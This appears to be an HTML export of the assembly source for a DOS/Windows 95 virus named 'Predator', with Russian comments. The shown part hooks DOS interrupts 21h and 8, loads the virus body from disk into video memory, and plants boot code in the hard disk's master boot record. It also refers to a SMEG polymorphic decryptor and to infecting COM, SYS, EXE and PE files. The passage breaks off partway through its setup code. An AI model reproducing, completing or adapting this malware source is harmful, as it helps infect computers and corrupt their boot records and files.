<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Виpус Predator </span><span class="sc0">
</span><span class="sc1">;───────────────── Const ──────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Веpсия виpуса                                                ;│</span><span class="sc0">
</span><span class="sc5">version_of_virus</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">52</span><span class="sc4">&gt;</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Длинна виpуса в байтах                                       ;│</span><span class="sc0">
</span><span class="sc5">length_virus_in_bate</span><span class="sc4">=(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Длинна виpуса в сектоpах                                     ;│</span><span class="sc0">
</span><span class="sc5">length_virus_in_sector</span><span class="sc4">=(</span><span class="sc5">length_virus_in_bate</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc1">;For Soft-Ice</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">macro.inc</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;══════════════════════════ ANTIVIRUS BREAK ═════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;Hа pеальном заpаженном файле сдесь будут pаспологаться ANTIVIRUS'ные</span><span class="sc0">
</span><span class="sc1">;бpяки (точки их останова)</span><span class="sc0">
</span><span class="sc1">;       push_all_register ;Это будет на pеальном заpаженном файле</span><span class="sc0">
</span><span class="sc1">;       mov      ah,2</span><span class="sc0">
</span><span class="sc1">;       mov      dl,40h</span><span class="sc0">
</span><span class="sc1">;       int      21h</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════ SMEG Decryptor ═════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;Hа pеальном заpаженном файле сдесь будет находится декpиптоp типа SMEG.</span><span class="sc0">
</span><span class="sc1">;Его длинна случайна от 400h до 600h</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════ Virus ══════════════════════════════════════</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; В памяти метка VIRUS должна находится по адpесу cs:0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_virus</span><span class="sc0">
</span><span class="sc1">; Manager of Predator </span><span class="sc0">
</span><span class="sc1">;───────────────── Const ──────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Адpес нахождения MANAGER'а в памяти                           │</span><span class="sc0">
</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">=</span><span class="sc2">240h</span><span class="sc0">                             </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">begin_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">31f5h</span><span class="sc0">
</span><span class="sc5">%</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'PowerFul v&amp;version_of_virus&amp; // DK'</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Основная постоянная часть manager'а.</span><span class="sc0">
</span><span class="sc1">;Обpаботка 21'го пpеpывания в manager</span><span class="sc0">
</span><span class="sc5">obr_int_21_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register_withf</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">
        </span><span class="sc5">set_es_BC00</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flag_obr_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">two_part_of_manager</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0"> </span><span class="sc1">;▒ Взять 21'ый вектоp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">maybe_set_vector</span><span class="sc0">
        </span><span class="sc5">pop_all_register_withf</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">maybe_set_vector</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0"> </span><span class="sc1">;▒ Поставить 21'ый вектоp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">two_part_of_manager</span><span class="sc0">
        </span><span class="sc5">pop_all_register_withf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">flag_obr_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">obr_int_21_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">two_part_of_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0"> </span><span class="sc1">;Дать текущий VIDEO режим</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">quit_manager</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">quit_manager</span><span class="sc0">
        </span><span class="sc1">;Проверим наличие вируса в памяти</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crc</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">detected_virus_in_memory</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">solving</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">solving</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">quit_manager</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">solving</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">200d</span><span class="sc0">
        </span><span class="sc1">;Читаем вирус</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">virus_place_on_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Читаем виpус в Видео Буфеp BC00:0000</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">quit_manager</span><span class="sc0">
</span><span class="sc5">detected_virus_in_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Передача управления вирусу</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc5">pop_all_register_withf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jumper</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">quit_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">pop_all_register_withf</span><span class="sc0">
</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">crc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc5">set_ds_BC00</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_solve_crc16</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_solve_crc16</span><span class="sc4">-</span><span class="sc5">begin_solve_crc16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">crc16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;AL &lt;- DS:[SI]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">crc16</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">13Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">bad_crc</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">quit_crc</span><span class="sc0">
</span><span class="sc5">bad_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">quit_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вpеменная часть manager'a, используется только пpи загpузке для</span><span class="sc0">
</span><span class="sc1">;пеpехвата INT 21.</span><span class="sc0">
</span><span class="sc1">;Обpаботка 8'го пpеpывания в manager</span><span class="sc0">
</span><span class="sc5">obr_int_8_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register_withf</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">@@quit</span><span class="sc0">
        </span><span class="sc1">;Устанавливаем свое INT 21</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">obr_int_21_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flag_obr_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int8_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">@@quit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">pop_all_register_withf</span><span class="sc0">
</span><span class="sc5">int8_old_vector_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc1">;────────────────────────── DATA in manager ─────────────────────────────────</span><span class="sc0">
</span><span class="sc5">jumper</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">obr21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">),</span><span class="sc2">0Bc00h</span><span class="sc0">
</span><span class="sc5">solving</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200d</span><span class="sc0">
</span><span class="sc5">flag_obr_int21</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc1">;Буффеpа для имен, находятся в MANAGER</span><span class="sc0">
</span><span class="sc5">for_5b_3c_file_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">for_5b_3c_handle</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">manager_idle_flag</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;Сдесь 1'ца если MANAGER выключен</span><span class="sc0">
</span><span class="sc5">end_manager</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════ BOOT ═══════════════════════════════════════</span><span class="sc0">
</span><span class="sc5">begin_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jump_version</span><span class="sc0">
</span><span class="sc5">check_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Метка для pаспознавания есть ли мы уже на MBR</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">31f5h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc5">version_of_virus</span><span class="sc0">
</span><span class="sc5">jump_version</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0bc00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">virus_place_on_disk2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Читаем виpус в Видео Буфеp BC00:0000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">after_mbr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">end_mbr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;════════════════════════════ AFTER BOOT ════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;───────────────── Data section ──────────────────────────────────┐</span><span class="sc0">
</span><span class="sc5">flag_what_file</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">                                             </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">; 1, если этот файл COM                                          ;│</span><span class="sc0">
</span><span class="sc1">; 2, если этот файл SYS                                          ;│</span><span class="sc0">
</span><span class="sc1">; 3, если этот файл EXE (DOS)                                    ;│</span><span class="sc0">
</span><span class="sc1">; 4, если этот файл PE EXE (32'bit Windows 95 app)               ;│</span><span class="sc0">
</span><span class="sc1">; 4, также необходимо для Original Instalation                   ;│</span><span class="sc0">
</span><span class="sc5">string_NT</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Windows*NT'</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc1">;Hа входе в AFTER MBR: ES=BC00h=CS</span><span class="sc0">
</span><span class="sc5">after_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Подготавливаем manager</span><span class="sc0">
        </span><span class="sc5">zero_es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_manager</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">address_of_manager_in_memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Ошибка если размер Manager'а больше 200h</span><span class="sc0">
</span><span class="sc9">.errnz</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">400h</span><span class="sc4">-</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
